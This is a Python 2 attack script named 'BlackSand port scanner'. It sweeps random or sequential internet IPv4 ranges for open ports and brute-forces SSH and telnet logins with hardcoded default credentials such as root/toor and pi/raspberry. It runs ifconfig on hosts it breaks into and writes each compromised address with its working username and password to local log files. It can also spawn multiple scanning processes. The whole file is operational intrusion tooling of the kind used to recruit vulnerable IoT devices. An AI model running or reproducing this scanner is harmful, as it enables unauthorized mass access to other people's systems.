import subprocess
import paramiko
import getpass
import telnetlib
import os
import sys
import optparse
import threading
#import socket
from socket import *
from random import randint
from Queue import Queue

usernames = ['admin', 'guest', 'pi', 'root', 'test']
passwords = ['1234', '12345', '123456', 'test', 'raspberry', 'guest', 'toor', 'root', 'admin', 'root1234', 'admin1234']

fixedLogin1 = ['admin:admin']
fixedLogin2 = ['admin:1234']
fixedLogin3 = ['root:root']
fixedLogin4 = ['root:1234']

global log
#log = open('cray.txt', 'a')

global scan
scan = False
 
global threads
parser = optparse.OptionParser("%prog -t <target host(s)> -p <target port(s)>")
parser.add_option('-t', dest='targetHosts', type='string', help='Specify the target host(s); Separate them by commas or enter \'scan\' to scan random addresses')
parser.add_option('-p', dest='targetPorts', type='string', help='Specify the target port(s); Separate them by commas----use \'all\' to scan 1-65535')
parser.add_option('-a', dest='aClass', type='string', help='Specify the 1st octet')
parser.add_option('-b', dest='bClass', type='string', help='Specify the 2nd octet')
parser.add_option('-c', dest='cClass', type='string', help='Specify the 3rd octet')
threads = 2
parser.add_option('-s', dest='threads', type='int', help='Specify number of threads for scanning')
parser.add_option('-l', action='store_true', dest='brute', default=False, help='Brute force ssh')
parser.add_option('-T', action='store_true', dest='bruteTel', default=False, help='Brute force telnet')
parser.add_option('-1', action='store_true', dest='bruting', default=False, help='Displays addresses that are being brute forced')
parser.add_option('-2', action='store_true', dest='scanned', default=False, help='Displays address that could not be connected to')
parser.add_option('-3', action='store_true', dest='passAttempt', default=False, help='Displays each password attempt during brute force')
parser.add_option('-4', action='store_true', dest='openPort', default=False, help='Displays when an address has the searched port open')
parser.add_option('-V', action='store_true', dest='verbose', default=False, help='Verbose mode')
parser.add_option('-f', dest='fixed', type='string', help='Specify a fixed login(1, 2, 3, 4)')
parser.add_option('-B', action='store_true', dest='bios', default=False, help='Create a bios for vuln using iterating IP gen')
parser.add_option('-o', dest='timeOut', type='float', help='Set a timeout value for scanning')
parser.add_option('-M', action='store_true', dest='master', default=False, help='User multiprocess scanning')
parser.add_option('-C', action='store_true', dest='child', default=False, help='DO NOT USE')


(options, args) = parser.parse_args()







if options.threads != None:
#  print('Scanning threads: ' + str(threads))
  threads = options.threads + 1

global firstBios
global secondBios
global thirdBios
global fourthBios
if options.bios != False:
 firstBios = 1
 secondBios = 1
 thirdBios = 1
 fourthBios = 1

#threads = 1
NUMBER_OF_THREADS = threads
JOB_NUMBER = range(1, threads)
queue = Queue()

#VERSION 1.2

if options.child == False:
 print('''
 
 BlackSand port scanner

  ____  _            _     ____                  _ 
 | __ )| | __ _  ___| | __/ ___|  __ _ _ __   __| |
 |  _ \| |/ _` |/ __| |/ /\___ \ / _` | '_ \ / _` |
 | |_) | | (_| | (__|   <  ___) | (_| | | | | (_| |
 |____/|_|\__,_|\___|_|\_\|____/ \__,_|_| |_|\__,_| v2.1
                                                   

 Developed By: @the.red.team

''')


switches = ''
print('\n              ----PARAMETERS----')
print('***********************************************')
if options.targetPorts != None:
 print('[!] Scanning for port(s): ' + str(options.targetPorts))
 switches = switches + ' -p ' + str(options.targetPorts)
if options.aClass != None:
 print('[!] Scanning using first octet: ' + str(options.aClass))
#    switches = switches + ' -a ' + str(options.aClass)
if options.bClass != None:
 print('[!] Scanning using second octet: ' + str(options.bClass))
#    switches = switches + ' -b ' + str(options.bClass)
if options.cClass != None:
 print('[!] Scanning using third octet: ' + str(options.cClass))
#    switches = switches + ' -c ' + str(options.cClass)
if options.brute != False:
 print('[!] Using ssh bruteforce')
 switches = switches + ' -l'
if options.bruteTel != False:
 print('[!] Using telnet bruteforce')
 switches = switches + ' -T'
if options.bruting != False:
 print('[!] Showing addresses being bruteForced')
 switches = switches + ' -1'
if options.scanned != False:
 print('[!] Showing showing all scan fails')
 switches = switches + ' -2'
if options.passAttempt != False:
 print('[!] Showing bruteforce attempts')
 switches = switches + ' -3'
if options.openPort != False:
 print('[!] Showing addresses with open ports')
 switches = switches + ' -4'
if options.verbose != False:
 print('[!] Showing all output')
 switches = switches + ' -V'
if options.fixed != None:
 print('[!] Using a fixed login option: ' + str(options.fixed))
 switches = switches + ' -f ' + str(options.fixed)
if options.bios != False:
 print('[!] Creating bios output')
 switches = switches + ' -B'
if options.timeOut != None:
 print('[!] Using timeout: ' + str(options.timeOut))
 switches = switches + ' -o ' + str(options.timeOut)
fName = os.path.realpath(__file__)
print('***********************************************\n')



global fourth
fourth = 0

def go():
# print('[!] NAILED IT!')
 go = True
 
def gen():
 global log
 global firstBios
 global secondBios
 global thirdBios
 global fourthBios
 global threads
 #print('started gen')
 try:
  parser = optparse.OptionParser("%prog -t <target host(s)> -p <target port(s)>")
  parser.add_option('-t', dest='targetHosts', type='string', help='Specify the target host(s); Separate them by commas or enter \'scan\' to scan random addresses')
  parser.add_option('-p', dest='targetPorts', type='string', help='Specify the target port(s); Separate them by commas----use \'all\' to scan 1-65535')
  parser.add_option('-a', dest='aClass', type='string', help='Specify the 1st octet')
  parser.add_option('-b', dest='bClass', type='string', help='Specify the 2nd octet')
  parser.add_option('-c', dest='cClass', type='string', help='Specify the 3rd octet')
  parser.add_option('-s', dest='threads', type='int', help='Specify number of threads for scanning')
  parser.add_option('-l', action='store_true', dest='brute', default=False, help='Brute force ssh')
  parser.add_option('-T', action='store_true', dest='bruteTel', default=False, help='Brute force telnet')
  parser.add_option('-1', action='store_true', dest='bruting', default=False, help='Displays addresses that are being brute forced')
  parser.add_option('-2', action='store_true', dest='scanned', default=False, help='Displays address that could not be connected to')
  parser.add_option('-3', action='store_true', dest='passAttempt', default=False, help='Displays each password attempt during brute force')
  parser.add_option('-4', action='store_true', dest='openPort', default=False, help='Displays when an address has the searched port open')
  parser.add_option('-V', action='store_true', dest='verbose', default=False, help='Verbose mode')
  parser.add_option('-f', dest='fixed', type='string', help='Specify a fixed login(1, 2, 3, 4)')
  parser.add_option('-B', action='store_true', dest='bios', default=False, help='Create a bios for vuln using iterating IP gen')
  parser.add_option('-o', dest='timeOut', type='float', help='Set a timeout value for scanning')
  parser.add_option('-M', action='store_true', dest='master', default=False, help='User multiprocess scanning')
  parser.add_option('-C', action='store_true', dest='child', default=False, help='DO NOT USE')
  (options, args) = parser.parse_args()
  if options.threads != None:
   threads = options.threads
  global fourth
  going = True
  processes = 0
  while going == True:
   if (options.aClass == None):
    if options.bios == False:
     first = randint(1, 254)
    else:
     first = firstBios
     if secondBios >= 255:
      firstBios = firstBios + 1
      secondBios = 1
     if firstBios >= 255:
#      print('[!] Reached maximum address allocation: EXITING')
      going = False
      break
#      sys.exit()
   else:
    first = options.aClass
    if options.bios != False:
     if secondBios >= 255:
#      print('[!] Reached maximum address allocation: EXITING')
      going = False
      break
#      sys.exit()
   if (options.bClass == None):
    if options.bios == False:
     second = randint(1, 254)
    else:
     second = secondBios
     if thirdBios >= 255:
      secondBios = secondBios + 1
      thirdBios = 1
   else:
    second = options.bClass
    if options.bios != False:
     if thirdBios >= 255:
#      print('[!] Reached maximum address allocation: EXITING')
      going = False
      break
#      sys.exit()
   if (options.cClass == None):
    if options.bios == False:
     third = randint(1, 254)
    else:
     third = thirdBios
     if fourthBios >= 255:
      thirdBios = thirdBios + 1
      fourthBios = 1
   else:
    third = options.cClass
    if options.bios != False:
     if fourthBios >= 255:
#      print('[!] Reached maximum address allocation: EXITING')
      going = False
      break
#      sys.exit()
   if options.bios == False:
    fourth = randint(1, 254)
   else:
    fourth = fourthBios
    fourthBios = fourthBios + 1
   targetHost = str(first) + '.' + str(second) + '.' + str(third) + '.' + str(fourth)
   targetPorts = str(options.targetPorts).split(',')
   if options.master == False:
    for targetPort in targetPorts:
     conn(targetHost, int(targetPort))
   else:
    command = str(sys.executable) + ' ' + str(fName) + ' -t ' + str(targetHost) + str(switches) + ' -C &'
    try:
     os.system(command)
#     subprocess.Popen(command, shell = True)
#     print(command)
     processes = processes + 1
    except:
     print('[!] Couldn\'t start separate process: ' + str(targetHost))
#    print('[!] ' + targetHost + '|' + str(targetPort))
  if options.master != False:
   print('[!] Finished assigning jobs | processes started: ' + str(processes) + '\n')
 except KeyboardInterrupt:
  print('Scanning stopped')
  sys.exit()
 
def conn(targetHost, targetPort):
 global threads
 parser = optparse.OptionParser("%prog -t <target host(s)> -p <target port(s)>")
 parser.add_option('-t', dest='targetHosts', type='string', help='Specify the target host(s); Separate them by commas or enter \'scan\' to scan random addresses')
 parser.add_option('-p', dest='targetPorts', type='string', help='Specify the target port(s); Separate them by commas----use \'all\' to scan 1-65535')
 parser.add_option('-a', dest='aClass', type='string', help='Specify the 1st octet')
 parser.add_option('-b', dest='bClass', type='string', help='Specify the 2nd octet')
 parser.add_option('-c', dest='cClass', type='string', help='Specify the 3rd octet')
 parser.add_option('-s', dest='threads', type='int', help='Specify number of threads for scanning')
 parser.add_option('-l', action='store_true', dest='brute', default=False, help='Brute force ssh')
 parser.add_option('-T', action='store_true', dest='bruteTel', default=False, help='Brute force telnet')
 parser.add_option('-1', action='store_true', dest='bruting', default=False, help='Displays addresses that are being brute forced')
 parser.add_option('-2', action='store_true', dest='scanned', default=False, help='Displays address that could not be connected to')
 parser.add_option('-3', action='store_true', dest='passAttempt', default=False, help='Displays each password attempt during brute force')
 parser.add_option('-4', action='store_true', dest='openPort', default=False, help='Displays when an address has the searched port open')
 parser.add_option('-V', action='store_true', dest='verbose', default=False, help='Verbose mode')
 parser.add_option('-f', dest='fixed', type='string', help='Specify a fixed login(1, 2, 3, 4)')
 parser.add_option('-B', action='store_true', dest='bios', default=False, help='Create a bios for vuln using iterating IP gen')
 parser.add_option('-o', dest='timeOut', type='float', help='Set a timeout value for scanning')
 parser.add_option('-M', action='store_true', dest='master', default=False, help='User multiprocess scanning')
 parser.add_option('-C', action='store_true', dest='child', default=False, help='DO NOT USE')
 (options, args) = parser.parse_args()
 if options.threads != None:
  threads = options.threads
 co = True
 
 scan = False
 if targetHost == 'scan':
  targetPort = str(options.targetPorts).split(',')
# print(options.targetHosts) print(targetHost)
  print('Scanning for ports: ' + str(targetPort))
 count = 0
 while count < 1:
   try:
    conn = socket(AF_INET, SOCK_STREAM)
#    if options.timeOut != None:
#     conn.setsockettimeout(int(options.timeOut))
    if targetHost == 'scan':
     targetHost = gen()
     count = count - 1
     scan = True
     for port in targetPort:
      try:
       conn.connect((targetHost, int(port)))
       conn.close()
      except Exception, e:
       if options.scanned != False or options.verbose != False:
        print '[!] Connection to ' + targetHost + ' port ' + str(port) + ' failed: ' + str(e)
       co = False
       conn.close()
       conn = socket(AF_INET, SOCK_STREAM)
 
    else:
     conn.connect((targetHost, targetPort))
     conn.close()
    if scan == False:
     if options.openPort != False or options.verbose != False and options.bios == False:
      print '[+] Connection to ' + targetHost + ' port ' + str(targetPort) + ' succeeded!'
     elif options.bios != False:
      print(targetHost)
     if options.bios == False:
      log = open('log.txt', 'a')
      log.write('[+] Connection to ' + targetHost + ' port ' + str(targetPort) + ' succeeded!\n')
     else:
      log = open('bios.txt', 'a')
      log.write(targetHost + '\n')
     log.close()
    elif co == True:
     if options.openPort != False or options.verbose != False and options.bios == False:
      print '[+] Connection to ' + targetHost + ' port ' + str(port) + ' succeeded!'
      log = open('log.txt', 'a')
      log.write('[+] Connection to ' + targetHost + ' port ' + str(port) + ' succeeded!\n')
     elif options.bios != False:
      print(targetHost)
      log = open('bios.txt', 'a')
      log.write(targetHost + '\n')
     log.close()
    if options.bruteTel != False and int(targetPort) == 23:
     br = True
     good = False
     HOST = targetHost
     if options.bruting != False or options.verbose != False:
      print('Attempting telnet brute force: ' + str(HOST))
     tn = telnetlib.Telnet(HOST)
     tn.read_until('login: ')
#     if 'closed' in resp:
#      print('[!] Closed in resp')
#      br = False
#      good = False
#      pass
     for username in usernames:
      for password in passwords:
       if options.passAttempt != False or options.verbose != False:
        print('[!] Trying: ' + HOST + ' | username: ' + username + ' | password: ' + password)
       user = username
#       try:
       tn.write(user + "\n")
#       except:
#        print('[!] Username invalid')
#        br = False
       try:
#        if password:
#        print('[!] waiting for password prompt')
        tn.read_until('Password: ')
#        print('[!] got password prompt')
        tn.write(password + "\n")
#        print('[!] presented password')
#        print('[!] Sending verification command')
        tn.write("ls\n")
        tn.write("exit\n")
#        print('[!] Sent command')
#        print('[!] read all')
        br = True
        good = True
#        print('[!] Changed variables')
        resp = tn.read_all()
#        print('[!] set resp variable')
#        print(resp)
        if 'Authentication failed' in resp:
#         print('[!] Authentication failed')
         br = False
         good = False
         pass
        elif 'Authentication failed' not in resp:
         br = True
         good = True
         break
        else:
         br = False
         good = False
         pass
       except:
        br = False
        good = False
#        print('[!] Password invalid')
        pass
      if br == True:
       break
     if 'logout' in resp:
      print('Succeeded: ' + targetHost + '|' + str(username) + '|' + str(password) + '|' + str(targetPort))
      log=open('vuln.txt', 'a')
      log.write(targetHost + '|' + str(username) + '|' + str(password) + '|' + str(targetPort) + '\n')
      log.close()
     tn.close()
    if options.brute != False and int(targetPort) == 22:
#     ssh = paramiko.Transport((targetHost, targetPort))
     if options.bruting != False or options.verbose != False:
      print('Attempting ssh brute force: ' + targetHost)
     br = True
     good = False
     if options.fixed == None:
      for username in usernames:
#       print('[!] Using username: ' + str(username))
       for password in passwords:
        br = True
        if options.passAttempt != False or options.verbose != False:
         print('Trying ' + targetHost + ' | username: ' + str(username) + ' | password: ' + password)
        try:
#         ssh.connect(username=username, password=password)
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
         paramiko.util.log_to_file("filename.log")
         ssh.connect(targetHost, port=int(targetPort), username=username, password=password, timeout=10)
         stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
         output = stdout.read()
         good = False
         if 'inet' in output:
          print(output)
          good = True
         ssh.close()
         go()
         br = True
#         print('[!] Set br to True')
#         good = True
         break
        except:
         ssh.close()
         br = False
         pass
       if br == True:
#        print('[!] Using br')
        break
     #END OF FOR LOOP
#      print('[!] Made it to else')
     else:
#      print('[!] Entered else')
      if options.fixed == '1':
       username = 'admin'
       password = 'admin'
      elif options.fixed == '2':
       username = 'admin'
       password = '1234'
      elif options.fixed == '3':
       username = 'root'
       password = 'root'
      elif options.fixed == '4':
       username = 'root'
       password = '1234'
      else:
       print('[!] That is not a fixed login option')
       sys.exit()
      br = True
      if options.passAttempt != False or options.verbose != False:
       print('Trying: ' + targetHost + ' | username: ' + str(username) + ' | password: ' + str(password) + ' | port: ' + str(targetPort))
      try:
#       ssh.connect(username=username, password=password)
       ssh = paramiko.SSHClient()
       ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
       paramiko.util.log_to_file("filename.log")
       ssh.connect(targetHost, port=int(targetPort), username=username, password=password, timeout=10)
       stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
       output = stdout.read()
       good = False
       if 'inet' in output:
        print(output)
        good = True
       ssh.close()
       go()
       br=True
#       good=True
#       print('[!] Good is True')
      except:
       ssh.close()
       br=False
#       print('[!] Good is false')
       good=False
       pass
#      if br == True:
#       print('[!] br is true')
#     print('[!] Made it past else')
     output = 'nope'
#     print(good)
     if good == True:
#      print('[!] good is true')
#      stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
#      output = stdout.read()
#     print(output)
#     if 'inet' in output:
      print('Succeeded: ' + targetHost + '|' + username + '|' + password + '|' + str(targetPort))
      log = open('login.txt', 'a')
      log.write(targetHost + '|' + username + '|' + password + '|' + str(targetPort) + '\n')
      log.close()
#     ssh.close()
   except Exception, e:
    if scan == False:
     if options.scanned != False or options.verbose != False:
      print '[!] Connection to ' + targetHost + ' port ' + str(targetPort) + ' failed: ' + str(e)
   finally:
#    if scan == False:
#     conn.close()
    count = count + 1
    if scan == True:
     targetHost = 'scan'
 
def main():
 global scan
 global threads
 parser = optparse.OptionParser("%prog -t <target host(s)> -p <target port(s)>")
 parser.add_option('-t', dest='targetHosts', type='string', help='Specify the target host(s); Separate them by commas or enter \'scan\' to scan random addresses')
 parser.add_option('-p', dest='targetPorts', type='string', help='Specify the target port(s); Separate them by commas----use \'all\' to scan 1-65535')
 parser.add_option('-a', dest='aClass', type='string', help='Specify the 1st octet')
 parser.add_option('-b', dest='bClass', type='string', help='Specify the 2nd octet')
 parser.add_option('-c', dest='cClass', type='string', help='Specify the 3rd octet')
 parser.add_option('-s', dest='threads', type='int', help='Specify number of threads for scanning')
 parser.add_option('-l', action='store_true', dest='brute', default=False, help='Brute force ssh')
 parser.add_option('-T', action='store_true', dest='bruteTel', default=False, help='Brute force telnet')
 parser.add_option('-1', action='store_true', dest='bruting', default=False, help='Displays addresses that are being brute forced')
 parser.add_option('-2', action='store_true', dest='scanned', default=False, help='Displays address that could not be connected to')
 parser.add_option('-3', action='store_true', dest='passAttempt', default=False, help='Displays each password attempt during brute force')
 parser.add_option('-4', action='store_true', dest='openPort', default=False, help='Displays when an address has the searched port open')
 parser.add_option('-V', action='store_true', dest='verbose', default=False, help='Verbose mode')
 parser.add_option('-f', dest='fixed', type='string', help='Specify a fixed login(1, 2, 3, 4)')
 parser.add_option('-B', action='store_true', dest='bios', default=False, help='Create a bios for vuln using iterating IP gen')
 parser.add_option('-o', dest='timeOut', type='float', help='Set a timeout value for scanning')
 parser.add_option('-M', action='store_true', dest='master', default=False, help='User multiprocess scanning')
 parser.add_option('-C', action='store_true', dest='child', default=False, help='DO NOT USE')
 (options, args) = parser.parse_args()
 if options.threads != None:
  threads = options.threads
  print('Scanning threads: ' + str(options.threads))
 if options.brute != False:
  if options.child == False:
#   print('Using ssh brute force')
   fuck = True
 if options.bruteTel != False:
  if options.child == False:
#   print('Using telnet brute force')
   fuck = True
 if (options.targetHosts == None) | (options.targetPorts == None):
  print parser.usage
  exit(0)
 
 targetHosts = str(options.targetHosts).split(',')
 if (options.targetPorts != 'all'):
  targetPorts = str(options.targetPorts).split(',')
 elif (options.targetHosts != 'scan'):
  targetPorts = range(1, 65535)
 if (options.targetPorts == 'all'):
  if options.timeOut != None:
   setdefaulttimeout(options.timeOut)
   print('Using timout: ' + str(options.timeOut))
  else:
   setdefaulttimeout(5)
 else:
  if options.timeOut != None:
   setdefaulttimeout(options.timeOut)
   if options.child == False:
    print('Using timout: ' + str(options.timeOut))
  else:
   setdefaulttimeout(5)
 if options.targetHosts == 'scan':
  #print('creating workers')
  try:
#   print('entered try')
   create_workers()
   create_jobs()
  except KeyboardInterrupt:
   print('enteres except')
   print('Stopping all threads')
   sys.exit()
 else:
  for targetHost in targetHosts:
   for targetPort in targetPorts:
    conn(targetHost, int(targetPort))
    #print ''

#Create worker threads
def create_workers():
 global threads

 for _ in range(NUMBER_OF_THREADS):
  t = threading.Thread(target=work)
  t.daemon = True
  t.start()
#Do the next job in the queue
def work():
 while True:
  x = queue.get()
  if x == 1:

   try:
    gen()
   except KeyboardInterrupt:
    sys.exit()
  queue.task_done()
#Each list item is a new job
def create_jobs():
 for x in JOB_NUMBER:
  queue.put(1)
# queue.put(1)
 queue.join()

#if __name__ == '__main__':
try:
 main()
except KeyboardInterrupt:
 print('fuck')